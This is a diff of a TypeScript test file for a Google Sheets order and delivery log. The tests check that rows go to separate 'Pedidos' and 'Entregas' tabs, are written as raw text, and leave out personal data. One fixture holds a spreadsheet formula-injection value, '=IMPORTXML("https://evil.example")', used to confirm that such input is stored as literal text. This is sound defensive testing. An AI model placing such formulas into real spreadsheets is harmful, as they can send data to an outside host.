@@ -8,7 +8,13 @@ import {
   SheetsError,
   serviceAccountAssertion,
 } from '../../src/server/integrations/sheets/google-sheets.js';
-import { SHEET_COLUMNS, sheetRow } from '../../src/server/services/notifications.js';
+import {
+  DELIVERY_COLUMNS,
+  deliveryRow,
+  playerConfirmationLabel,
+  SHEET_COLUMNS,
+  sheetRow,
+} from '../../src/server/services/notifications.js';
 
 // Llave RSA sintética, generada en memoria solo para esta prueba (nunca se escribe en disco).
 const { privateKey, publicKey } = generateKeyPairSync('rsa', {
@@ -72,11 +78,11 @@ describe('Google Sheets: cuenta de servicio (JWT RS256)', () => {
       spreadsheetId: SPREADSHEET_ID,
       clientEmail: CLIENT_EMAIL,
       privateKey,
-      tab: 'Pedidos',
+      tabs: { orders: 'Pedidos', deliveries: 'Entregas' },
       fetch: fetcher.impl,
     });
-    await log.appendRow(['TGS-AAAAAAAAAA', '=IMPORTXML("https://evil.example")', 3800]);
-    await log.appendRow(['TGS-BBBBBBBBBB', 'Pago confirmado', 11000]);
+    await log.appendRow('orders', ['TGS-AAAAAAAAAA', '=IMPORTXML("https://evil.example")', 3800]);
+    await log.appendRow('orders', ['TGS-BBBBBBBBBB', 'Pago confirmado', 11000]);
     expect(fetcher.calls).toHaveLength(3);
     const [token, append] = fetcher.calls;
     expect(token?.url).toBe(GOOGLE_TOKEN_URL);
@@ -103,10 +109,10 @@ describe('Google Sheets: cuenta de servicio (JWT RS256)', () => {
       spreadsheetId: SPREADSHEET_ID,
       clientEmail: CLIENT_EMAIL,
       privateKey,
-      tab: 'Pedidos',
+      tabs: { orders: 'Pedidos', deliveries: 'Entregas' },
       fetch: fetcher.impl,
     });
-    const error = await log.appendRow(['x']).catch((caught: unknown) => caught);
+    const error = await log.appendRow('orders', ['x']).catch((caught: unknown) => caught);
     expect(error).toBeInstanceOf(SheetsError);
     expect((error as SheetsError).status).toBe(400);
     expect(String((error as Error).message)).not.toContain('privada');
@@ -124,14 +130,34 @@ describe('Google Sheets: cuenta de servicio (JWT RS256)', () => {
       spreadsheetId: SPREADSHEET_ID,
       clientEmail: CLIENT_EMAIL,
       privateKey,
-      tab: 'Pedidos',
+      tabs: { orders: 'Pedidos', deliveries: 'Entregas' },
       fetch: fetcher.impl,
     });
-    await expect(log.appendRow(['x'])).rejects.toBeInstanceOf(SheetsError);
-    await log.appendRow(['x']);
+    await expect(log.appendRow('orders', ['x'])).rejects.toBeInstanceOf(SheetsError);
+    await log.appendRow('orders', ['x']);
     expect((fetcher.calls[3]?.init.headers as Record<string, string>).authorization).toBe(
       'Bearer segundo',
     );
+  });
+});
+
+describe('Google Sheets: pestaña «Entregas»', () => {
+  it('escribe en la pestaña configurada para entregas, también como texto literal', async () => {
+    const fetcher = fakeFetch([json({ access_token: 'token' }), json({})]);
+    const log = new GoogleSheetsLog({
+      spreadsheetId: SPREADSHEET_ID,
+      clientEmail: CLIENT_EMAIL,
+      privateKey,
+      tabs: { orders: 'Pedidos', deliveries: 'Entregas' },
+      fetch: fetcher.impl,
+    });
+    await log.appendRow('deliveries', ['TGS-AAAAAAAAAA', '0123456789', '=HYPERLINK("x")']);
+    const append = fetcher.calls[1];
+    expect(append?.url).toContain(`/values/${encodeURIComponent('Entregas!A1')}:append?`);
+    expect(append?.url).toContain('valueInputOption=RAW');
+    expect(JSON.parse(append?.init.body as string)).toEqual({
+      values: [['TGS-AAAAAAAAAA', '0123456789', '=HYPERLINK("x")']],
+    });
   });
 });
 
@@ -159,14 +185,25 @@ describe('Google Sheets: configuración', () => {
     ).toThrow(ConfigError);
   });
 
-  it('con las tres variables queda configurado (pestaña «Pedidos» por defecto)', () => {
+  it('con las tres variables queda configurado (pestañas «Pedidos» y «Entregas» por defecto)', () => {
     const config = loadConfig(sheetsEnv());
     expect(config.sheets).toMatchObject({
       spreadsheetId: SPREADSHEET_ID,
       clientEmail: CLIENT_EMAIL,
-      tab: 'Pedidos',
+      tabs: { orders: 'Pedidos', deliveries: 'Entregas' },
     });
     expect(config.sheets?.privateKey).toBe(privateKey);
+  });
+
+  it('la pestaña de entregas nunca puede ser la de pedidos (que va sin datos personales)', () => {
+    expect(() =>
+      loadConfig(
+        sheetsEnv({ GOOGLE_SHEETS_TAB: 'Pedidos', GOOGLE_SHEETS_DELIVERY_TAB: 'pedidos' }),
+      ),
+    ).toThrow(ConfigError);
+    expect(
+      loadConfig(sheetsEnv({ GOOGLE_SHEETS_DELIVERY_TAB: 'Recargas' })).sheets?.tabs.deliveries,
+    ).toBe('Recargas');
   });
 });
 
@@ -198,5 +235,82 @@ describe('Google Sheets: fila del registro', () => {
       '0b5a3f5e-1111-4222-8333-944455556666',
     ]);
     expect(row).toHaveLength(SHEET_COLUMNS.length);
+  });
+});
+
+describe('Google Sheets: fila de «Entregas»', () => {
+  const order = {
+    reference: 'TGS-ABCDEFGHJK',
+    totalCop: 3800,
+    items: [{ name: '100 + 10 Diamantes', quantity: 2, unitPriceCop: 1900, lineTotalCop: 3800 }],
+    receipt: { number: 12 },
+    playerUid: '0123456789',
+    nickname: 'JugadorPro',
+    region: 'CO',
+    server: 'Latinoamérica',
+    verificationStatus: 'CONFIRMED' as const,
+    verificationNote: 'proveedor:prueba',
+    verifiedByOwner: false,
+  };
+
+  it('lleva lo que hace falta para recargar y nunca correo, nombre ni PIN', () => {
+    const row = deliveryRow(
+      { id: '0b5a3f5e-1111-4222-8333-944455556666', createdAt: new Date('2026-10-18T17:05:00Z') },
+      'order_paid_event',
+      order,
+      { payment: 'CONFIRMED', recharge: 'PENDING' },
+    );
+    expect(row).toEqual([
+      '2026-10-18 12:05',
+      'TGS-ABCDEFGHJK',
+      'Pago confirmado',
+      '0123456789',
+      'JugadorPro',
+      'Confirmado con la búsqueda de ID',
+      'Latinoamérica',
+      'CO',
+      '2× 100 + 10 Diamantes',
+      3800,
+      'Confirmado',
+      'Pendiente',
+      '000012',
+      '0b5a3f5e-1111-4222-8333-944455556666',
+    ]);
+    expect(row).toHaveLength(DELIVERY_COLUMNS.length);
+    // El ID va como texto: un número perdería los ceros a la izquierda.
+    expect(typeof row[3]).toBe('string');
+  });
+
+  it('sin nickname, servidor ni región deja esas celdas vacías', () => {
+    const row = deliveryRow(
+      { id: 'id', createdAt: new Date('2026-10-18T17:05:00Z') },
+      'order_delivered_event',
+      { ...order, nickname: null, region: null, server: null, receipt: null },
+      { payment: 'CONFIRMED', recharge: 'COMPLETED' },
+    );
+    expect([row[4], row[6], row[7], row[12]]).toEqual(['', '', '', '']);
+    expect(row[2]).toBe('Recarga entregada');
+  });
+
+  it('dice cómo se confirmó el jugador sin copiar la nota del operador', () => {
+    const label = (overrides: Partial<Parameters<typeof playerConfirmationLabel>[0]>) =>
+      playerConfirmationLabel({
+        verificationStatus: 'CONFIRMED',
+        verificationNote: null,
+        verifiedByOwner: false,
+        ...overrides,
+      });
+    expect(label({ verificationNote: 'proveedor:x' })).toBe('Confirmado con la búsqueda de ID');
+    expect(label({ verificationNote: 'cliente' })).toBe(
+      'Confirmado por el cliente (escribió su ID dos veces)',
+    );
+    expect(label({ verifiedByOwner: true, verificationNote: 'nota privada del operador' })).toBe(
+      'Verificado por el dueño y aceptado por el cliente',
+    );
+    // Aunque el operador escriba «cliente» o «proveedor:…» en su nota, cuenta que verificó él.
+    expect(label({ verifiedByOwner: true, verificationNote: 'proveedor:x' })).toBe(
+      'Verificado por el dueño y aceptado por el cliente',
+    );
+    expect(label({ verificationStatus: 'NOT_FOUND' })).toBe('ID no encontrado');
   });
 });
